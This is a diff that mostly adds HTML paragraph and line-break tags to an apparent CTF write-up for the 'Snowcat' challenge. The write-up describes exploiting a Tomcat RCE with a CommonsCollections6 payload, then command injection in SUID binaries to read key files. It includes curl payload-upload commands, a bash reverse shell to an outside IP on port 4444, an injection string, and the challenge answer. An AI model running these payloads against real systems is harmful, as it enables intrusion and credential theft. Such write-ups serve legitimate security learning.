@@ -28,11 +28,14 @@ nav: |
 </tr>
 </tbody>
 </table>
-
+<p>
 <h2>Solution Overview</h2>
-
+<br>
+</p>
+<p>
 Starting with an account with minimal access to the system, the website was found to be running Apache Tomcat version 9.0.90. This version is susceptable to a Remote Code Execution (RCE) vulnerability. This vulnerability was exploited to gain the privileges of the web application service account. Three binaries were discovered with Set User ID (SUID), a special permission in Unix/Linux systems that allows a file to run with the privileges of the file owner rather than the user executing it. These files were susceptable to command injection, allowing commands to be executed as a user with higher privileges. This enabled access to the authorized_keys file.
-
+<br>
+</p>
 <table>
 <thead>
 <tr>
@@ -69,15 +72,24 @@ Starting with an account with minimal access to the system, the website was foun
 </tr>
 </tbody>
 </table>
-
+<p>
 <h2>Detailed Solution</h2>
+<br>
+</p>
 <details>
+<p>
 <summary>Click to expand</summary>
-
+<br>
+</p>
+<p>
 Using a nonexistent URL (http://localhost/nonexistant), an error message was triggered revealing that the system is running a potentially vulnerable version of Tomcat.
-
+<br>
+</p>
+<p>
 <img src="/HHC_2025/images/snowcat_version.jpg" alt="Tomcat Version Evidence">
-
+<br>
+</p>
+<p>
 Testing identified the CommonsCollections6 gadget could effectively deliver a payload. The initial approach was to touch a file in the /tmp directory to confirm a successful attack.
 <br>
 Payload details:
@@ -91,10 +103,16 @@ ls -la /tmp/pwned 2>/dev/null && echo "SUCCESS with touch!" || echo "Failed"
 </code></pre>
 <br>
 The initial payload was delivered and successful:
-
+<br>
+</p>
+<p>
 <img src="/HHC_2025/images/snowcat_initialpayload.jpg" alt="Tomcat Initial Payload Evidence">
-
+<br>
+</p>
+<p>
 To achieve a remote shell, the following approach was used:
+<br>
+</p>
 <ol>
 <li>Setup a linux machine in linode, and start a netcat listener on port 4444</li>
 <li>As the low level user, create a shell code in the /tmp directory</li>
@@ -102,13 +120,15 @@ To achieve a remote shell, the following approach was used:
 <li>Send a payload to set the SUID on the shell file</li>
 <li>Send a payload that uses setsid to detach the process completely from the invoking script and run the shell</li>
 </ol>
-
+<p>
 The shell file used was:
 <br>
 <pre><code class="language-sh">
 bash -i >& /dev/tcp/69.164.211.205/4444 0>&1
 </code></pre>
-
+<br>
+</p>
+<p>
 The payload used to set the SUID was:
 <br>
 <pre><code class="language-sh">
@@ -122,7 +142,9 @@ curl -s -H "Cookie: JSESSIONID=.${SESSION_ID}" "http://localhost/" > /dev/null
 </code></pre>
 <br>
 Initial payloads failed, due to the payload script completing before the shell was established, killing the shell. Using setsid to detach the shell process from the script, allowed it to establish the connection.
-
+<br>
+</p>
+<p>
 The payload used setid and ran the shell was:
 <br>
 <pre><code class="language-sh">
@@ -134,51 +156,61 @@ curl -s -X PUT -H "Content-Length: $(wc -c < payload.bin)" -H "Content-Range: by
 <!-- Trigger payload -->
 curl -s -H "Cookie: JSESSIONID=.${SESSION_ID}" "http://localhost/" > /dev/null
 </code></pre>
-
+<br>
+</p>
+<p>
 This resulted in access as the identity running the web service:
-
+<br>
+</p>
+<p>
 <img src="/HHC_2025/images/snowcat_serviceaccount.jpg" alt="Snowcat Service Account User">
-
+<br>
+</p>
+<p>
 Three binaries were discovered that the service account has access to with the SUID set:
 <br>
 These binaries have SUID set:
-
+<br>
+</p>
 <ul>
 <li>/usr/local/weather/humidity</li>
 </ul>
-
 <ul>
 <li>/usr/local/weather/pressure</li>
 </ul>
-
 <ul>
 <li>/usr/local/weather/temperature</li>
 </ul>
-
+<p>
 The commands are run with a valid key:
-
+<br>
+</p>
 <ul>
 <li>/usr/local/weather/temperature 4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6</li>
 </ul>
-
 <ul>
 <li>/usr/local/weather/humidity 4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6</li>
 </ul>
-
 <ul>
 <li>/usr/local/weather/pressure 4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6</li>
 </ul>
-
+<p>
 The weather user has access to the /usr/local/weather/keys directory. This was our target:
-
+<br>
+</p>
+<p>
 <img src="/HHC_2025/images/snowcat_keys.jpg" alt="Keys Directory">
-
+<br>
+</p>
+<p>
 The following command was injected into the binary command line to create a file containing the contents of the keys folder and change the file permissions:
 <br>
 <pre><code class="language-">
 /usr/local/weather/temperature "4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6';cat /usr/local/weather/keys/* > /tmp/keys.txt;chmod 644 /tmp/keys.txt;echo '"
 </code></pre>
-
+<br>
+</p>
+<p>
 Viewing the contents of the file revealed:
 <br>
 <pre><code class="language-">
@@ -188,13 +220,17 @@ cat /tmp/keys.txt
 </code></pre>
 <br>
 The first key listed is the one used with the temperature binary. The second key is not used by snowcat.
-
+<br>
+</p>
+<p>
 <strong>Answer: 8ade723d-9968-45c9-9c33-7606c49c2201</strong>
-
+<br>
+</p>
 </details>
-
+<p>
 <h2>Tools Reference</h2>
-
+<br>
+</p>
 <table>
 <thead>
 <tr>
@@ -221,8 +257,10 @@ The first key listed is the one used with the temperature binary. The second key
 </tr>
 </tbody>
 </table>
-
+<p>
 <h2>Hints Reference</h2>
+<br>
+</p>
 <table>
 <thead>
 <tr>
@@ -249,8 +287,10 @@ The first key listed is the one used with the temperature binary. The second key
 </tr>
 </tbody>
 </table>
-
+<p>
 <h2>Acknowledgements</h2>
+<br>
+</p>
 <table>
 <thead>
 <tr>
@@ -265,4 +305,3 @@ The first key listed is the one used with the temperature binary. The second key
 </tr>
 </tbody>
 </table>
-
